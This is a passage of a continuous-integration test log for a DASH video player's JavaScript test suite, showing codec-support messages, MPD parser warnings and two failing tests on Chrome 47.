'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Updated SegmentIndex', '134:', 3, '->', 5, 'SegmentReference(s).'\nINFO: 'Updated SegmentIndex', '135:', 3, '->', 3, 'SegmentReference(s).'\nINFO: 'Updated SegmentIndex', '136:', 3, '->', 5, 'SegmentReference(s).'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Updated SegmentIndex', '141:', 3, '->', 3, 'SegmentReference(s).'\nINFO: 'Updated SegmentIndex', '142:', 3, '->', 3, 'SegmentReference(s).'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Updated SegmentIndex', '146:', 3, '->', 3, 'SegmentReference(s).'\nINFO: 'Updated SegmentIndex', '147:', 3, '->', 3, 'SegmentReference(s).'\nINFO: 'Added Stream video-added.'\nINFO: 'Updated SegmentIndex', '148:', 3, '->', 3, 'SegmentReference(s).'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\n...\nChrome 47.0.2526 (Linux 0.0.0) mpd.BaseUrl resolves relative URLs with respect to the MPD URL FAILED\n    TypeError: Cannot read property 'toString' of undefined\n        at Object.<anonymous> (/var/lib/jenkins/jobs/Manual PR Test/workspace/spec/mpd_parser_base_url_spec.js:152:23)\n......................\nWARN: 'SegmentList does not contain sufficient segment information:', 'the SegmentList specifies multiple segments,', 'but does not specify a segment duration or timeline.', {baseUrl: null, timescale: 9000, presentationTimeOffset: null, segmentDuration: null, startNumber: 1, initialization: null, segmentUrls: [{mediaUrl: ..., mediaRange: ...}, {mediaUrl: ..., mediaRange: ...}], timeline: null}\n..........\nWARN: 'SegmentTimeline contains a large gap/overlap.', 'The content may have errors in it.', {startTime: 21, duration: 10, repeat: null}\nWARN: 'SegmentTimeline contains a large gap/overlap.', 'The content may have errors in it.', {startTime: 32, duration: 10, repeat: null}\n.\nWARN: 'SegmentTimeline contains a large gap/overlap.', 'The content may have errors in it.', {startTime: 20, duration: 10, repeat: null}\nWARN: 'SegmentTimeline contains a large gap/overlap.', 'The content may have errors in it.', {startTime: 29, duration: 10, repeat: null}\n....\nWARN: 'The MPD is 'dynamic' but @availabilityStartTime is not specified:', 'treating @availabilityStartTime as if it were the current time.'\nWARN: 'SegmentTemplate does not contain any segment information:', 'the SegmentTemplate must contain either an index URL template', 'a SegmentTimeline, or a segment duration.', {timescale: 1, presentationTimeOffset: null, segmentDuration: null, startNumber: 1, mediaUrlTemplate: null, indexUrlTemplate: null, initializationUrlTemplate: null, timeline: null}\n.\nWARN: 'The MPD is 'dynamic' but @availabilityStartTime is not specified:', 'treating @availabilityStartTime as if it were the current time.'\nWARN: 'SegmentTemplate does not contain any segment information:', 'the SegmentTemplate must contain either an index URL template', 'a SegmentTimeline, or a segment duration.', {timescale: 1, presentationTimeOffset: null, segmentDuration: null, startNumber: 1, mediaUrlTemplate: null, indexUrlTemplate: null, initializationUrlTemplate: null, timeline: null}\n....\nWARN: 'Representation contains multiple segment information sources:', 'the Representation should only contain one of SegmentBase,', 'SegmentList, or SegmentTemplate.', {id: null, lang: null, bandwidth: null, width: null, height: null, mimeType: null, codecs: null, baseUrl: null, segmentBase: {baseUrl: null, timescale: 1, presentationTimeOffset: null, indexRange: null, representationIndex: null, initialization: null}, segmentList: {baseUrl: null, timescale: 1, presentationTimeOffset: null, segmentDuration: null, startNumber: 1, initialization: null, segmentUrls: [], timeline: null}, segmentTemplate: null, contentProtections: []}\nINFO: 'Using SegmentBase by default.'\n.\nWARN: 'Representation contains multiple segment information sources:', 'the Representation should only contain one of SegmentBase,', 'SegmentList, or SegmentTemplate.', {id: null, lang: null, bandwidth: null, width: null, height: null, mimeType: null, codecs: null, baseUrl: null, segmentBase: {baseUrl: null, timescale: 1, presentationTimeOffset: null, indexRange: null, representationIndex: null, initialization: null}, segmentList: null, segmentTemplate: {timescale: 1, presentationTimeOffset: null, segmentDuration: null, startNumber: 1, mediaUrlTemplate: null, indexUrlTemplate: null, initializationUrlTemplate: null, timeline: null}, contentProtections: []}\nINFO: 'Using SegmentBase by default.'\n.\nWARN: 'Representation contains multiple segment information sources:', 'the Representation should only contain one of SegmentBase,', 'SegmentList, or SegmentTemplate.', {id: null, lang: null, bandwidth: null, width: null, height: null, mimeType: null, codecs: null, baseUrl: null, segmentBase: null, segmentList: {baseUrl: null, timescale: 1, presentationTimeOffset: null, segmentDuration: null, startNumber: 1, initialization: null, segmentUrls: [], timeline: null}, segmentTemplate: {timescale: 1, presentationTimeOffset: null, segmentDuration: null, startNumber: 1, mediaUrlTemplate: null, indexUrlTemplate: null, initializationUrlTemplate: null, timeline: null}, contentProtections: []}\nINFO: 'Using SegmentList by default.'\n.\nWARN: 'Representation contains multiple segment information sources:', 'the Representation should only contain one of SegmentBase,', 'SegmentList, or SegmentTemplate.', {id: null, lang: null, bandwidth: null, width: null, height: null, mimeType: null, codecs: null, baseUrl: null, segmentBase: {baseUrl: null, timescale: 1, presentationTimeOffset: null, indexRange: null, representationIndex: null, initialization: null}, segmentList: {baseUrl: null, timescale: 1, presentationTimeOffset: null, segmentDuration: null, startNumber: 1, initialization: null, segmentUrls: [], timeline: null}, segmentTemplate: {timescale: 1, presentationTimeOffset: null, segmentDuration: null, startNumber: 1, mediaUrlTemplate: null, indexUrlTemplate: null, initializationUrlTemplate: null, timeline: null}, contentProtections: []}\nINFO: 'Using SegmentBase by default.'\n.\nWARN: 'Representation does not contain any segment information:', 'the Representation must contain one of SegmentBase,', 'SegmentList, or SegmentTemplate.', {id: null, lang: null, bandwidth: null, width: null, height: null, mimeType: null, codecs: null, baseUrl: null, segmentBase: null, segmentList: null, segmentTemplate: null, contentProtections: []}\n.\nWARN: 'Some Periods may not have valid start times or durations;', '@mediaPresentationDuration may not include the duration of all', 'periods.'\nWARN: 'SegmentTemplate does not contain any segment information:', 'the SegmentTemplate must contain either an index URL template', 'a SegmentTimeline, or a segment duration.', {timescale: 1, presentationTimeOffset: null, segmentDuration: null, startNumber: 1, mediaUrlTemplate: null, indexUrlTemplate: null, initializationUrlTemplate: null, timeline: null}\nWARN: 'SegmentTemplate does not contain any segment information:', 'the SegmentTemplate must contain either an index URL template', 'a SegmentTimeline, or a segment duration.', {timescale: 1, presentationTimeOffset: null, segmentDuration: null, startNumber: 1, mediaUrlTemplate: null, indexUrlTemplate: null, initializationUrlTemplate: null, timeline: null}\n.\nWARN: 'Some Periods may not have valid start times or durations;', '@mediaPresentationDuration may not include the duration of all', 'periods.'\nWARN: 'SegmentTemplate does not contain any segment information:', 'the SegmentTemplate must contain either an index URL template', 'a SegmentTimeline, or a segment duration.', {timescale: 1, presentationTimeOffset: null, segmentDuration: null, startNumber: 1, mediaUrlTemplate: null, indexUrlTemplate: null, initializationUrlTemplate: null, timeline: null}\nWARN: 'SegmentTemplate does not contain any segment information:', 'the SegmentTemplate must contain either an index URL template', 'a SegmentTimeline, or a segment duration.', {timescale: 1, presentationTimeOffset: null, segmentDuration: null, startNumber: 1, mediaUrlTemplate: null, indexUrlTemplate: null, initializationUrlTemplate: null, timeline: null}\n.\nWARN: 'Some Periods may not have valid start times or durations;', '@mediaPresentationDuration may not include the duration of all', 'periods.'\nWARN: 'SegmentTemplate does not contain any segment information:', 'the SegmentTemplate must contain either an index URL template', 'a SegmentTimeline, or a segment duration.', {timescale: 1, presentationTimeOffset: null, segmentDuration: null, startNumber: 1, mediaUrlTemplate: null, indexUrlTemplate: null, initializationUrlTemplate: null, timeline: null}\nWARN: 'SegmentTemplate does not contain any segment information:', 'the SegmentTemplate must contain either an index URL template', 'a SegmentTimeline, or a segment duration.', {timescale: 1, presentationTimeOffset: null, segmentDuration: null, startNumber: 1, mediaUrlTemplate: null, indexUrlTemplate: null, initializationUrlTemplate: null, timeline: null}\n.\nWARN: 'Some Periods may not have valid start times or durations;', '@mediaPresentationDuration may not include the duration of all', 'periods.'\nWARN: 'SegmentTemplate does not contain any segment information:', 'the SegmentTemplate must contain either an index URL template', 'a SegmentTimeline, or a segment duration.', {timescale: 1, presentationTimeOffset: null, segmentDuration: null, startNumber: 1, mediaUrlTemplate: null, indexUrlTemplate: null, initializationUrlTemplate: null, timeline: null}\nWARN: 'SegmentTemplate does not contain any segment information:', 'the SegmentTemplate must contain either an index URL template', 'a SegmentTimeline, or a segment duration.', {timescale: 1, presentationTimeOffset: null, segmentDuration: null, startNumber: 1, mediaUrlTemplate: null, indexUrlTemplate: null, initializationUrlTemplate: null, timeline: null}\n...\nWARN: 'Some Periods may not have valid start times or durations;', '@mediaPresentationDuration may not include the duration of all', 'periods.'\nWARN: 'SegmentBase does not contain sufficient segment information:', 'the SegmentBase does not contain @indexRange', 'or a RepresentationIndex element.', {baseUrl: null, timescale: 1, presentationTimeOffset: null, indexRange: null, representationIndex: null, initialization: null}\n.\nWARN: 'Some Periods may not have valid start times or durations;', '@mediaPresentationDuration may not include the duration of all', 'periods.'\nWARN: 'Representation does not contain sufficient segment information:', 'the Representation must contain a BaseURL.', {id: null, lang: null, bandwidth: 250000, width: null, height: null, mimeType: 'video/mp4', codecs: null, baseUrl: null, segmentBase: {baseUrl: null, timescale: 1, presentationTimeOffset: null, indexRange: null, representationIndex: null, initialization: null}, segmentList: null, segmentTemplate: null, contentProtections: []}\n.\nWARN: 'Invalid duration string:', '-PT3S'\nWARN: 'Invalid duration string:', 'PT-3S'\nWARN: 'Invalid duration string:', 'P1Sasdf'\nWARN: 'Invalid duration string:', '1H2M3S'\nWARN: 'Invalid duration string:', '123'\nWARN: 'Invalid duration string:', 'abc'\n...................\nChrome 47.0.2526 (Linux 0.0.0) mpd handles a Location element with a BaseURL FAILED\n    Expected 'updated_mpd' to be 'http://example.com/updated_mpd'.\n        at Object.<anonymous> (/var/lib/jenkins/jobs/Manual PR Test/workspace/spec/mpd_spec.js:555:43)\n..\nWARN: 'URL template should not contain a width specifier for identifier', '\"RepresentationID\":', '/example/$RepresentationID%01d$.mp4'\nWARN: 'URL template does not have an available substitution for identifier', '\"RepresentationID\":', '/example/$RepresentationID$.mp4'\n.\nWARN: 'URL template does not have an available substitution for identifier', '\"Number\":', '/example/$Number$.mp4'\n.\nWARN: 'URL template does not have an available substitution for identifier', '\"Bandwidth\":', '/example/$Bandwidth$.mp4'\n.\nWARN: 'URL template does not have an available substitution for identifier', '\"Time\":', '/example/$Time$.mp4'\n..\nWARN: 'URL template contains an illegal character:', '/example/$RepresentationID%$'\n.\nWARN: 'URL template contains an illegal character:', '/example/$Time%.mp4'\n...\nWARN: 'SegmentTimeline contains a large gap/overlap.', 'The content may have errors in it.', {startTime: 15, duration: 10, repeat: 0}\n.\nWARN: 'SegmentTimeline contains a large gap/overlap.', 'The content may have errors in it.', {startTime: 10, duration: 10, repeat: 0}\n...\nWARN: 'SegmentTimeline contains a large gap/overlap.', 'The content may have errors in it.', {startTime: 35, duration: 10, repeat: 0}\n..\nWARN: 'SegmentTimeline contains a large gap/overlap.', 'The content may have errors in it.', {startTime: 45, duration: 5, repeat: 0}\n..\nWARN: 'SegmentTimeline \"S\" element does not have a duration:', 'ignoring the remaining \"S\" elements.', {startTime: 20, duration: null, repeat: 0}\n.\nINFO: 'Using native Promises.'\nINFO: 'Using native EME as-is.'\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 10\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 45\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 45\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 45\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp9\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp9\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp9\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp9\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp9\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp9\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp9\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream video/webm:', 'stream has started.'\nINFO: 'Stream audio/webm:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\nWARN: 'SBM audio/mp4:', 'appendBuffer() should not modify the MediaSource's duration:', 'before', 181.43107777777777, 'after', 181.463968, 'delta', 0.032890222222221155\nINFO: 'Signalling end-of-stream.'\nWARN: 'endOfStream() should not modify the MediaSource's duration:', 'before', 181.463968, 'after', 181.431077, 'delta', -0.03289100000000644\nWARN: 'SBM audio/mp4:', 'appendBuffer() should not modify the MediaSource's duration:', 'before', 181.431077, 'after', 181.463968, 'delta', 0.03289100000000644\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 180.43107777777777\nWARN: 'SBM audio/mp4:', 'appendBuffer() should not modify the MediaSource's duration:', 'before', 181.43107777777777, 'after', 181.463968, 'delta', 0.032890222222221155\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\nINFO: 'Signalling end-of-stream.'\nWARN: 'endOfStream() should not modify the MediaSource's duration:', 'before', 181.463968, 'after', 181.431077, 'delta', -0.03289100000000644\nWARN: 'SBM audio/mp4:', 'appendBuffer() should not modify the MediaSource's duration:', 'before', 181.431077, 'after', 181.463968, 'delta', 0.03289100000000644\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nWARN: 'SBM audio/mp4:', 'appendBuffer() should not modify the MediaSource's duration:', 'before', 181.43107777777777, 'after', 181.463968, 'delta', 0.032890222222221155\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\nINFO: 'Signalling end-of-stream.'\nWARN: 'endOfStream() should not modify the MediaSource's duration:', 'before', 181.463968, 'after', 181.431077, 'delta', -0.03289100000000644\nWARN: 'SBM audio/mp4:', 'appendBuffer() should not modify the MediaSource's duration:', 'before', 181.431077, 'after', 181.463968, 'delta', 0.03289100000000644\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\nWARN: 'SBM audio/mp4:', 'appendBuffer() should not modify the MediaSource's duration:', 'before', 181.43107777777777, 'after', 181.463968, 'delta', 0.032890222222221155\nINFO: 'Signalling end-of-stream.'\nWARN: 'endOfStream() should not modify the MediaSource's duration:', 'before', 181.463968, 'after', 181.431077, 'delta', -0.03289100000000644\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\nINFO: 'Stream video/mp4:', 'retrying segment request in 5 seconds...'\nINFO: 'Stream video/mp4:', 'retrying segment request in 5 seconds...'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: 'Using native Promises.'\nINFO: 'Using native EME as-is.'\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: 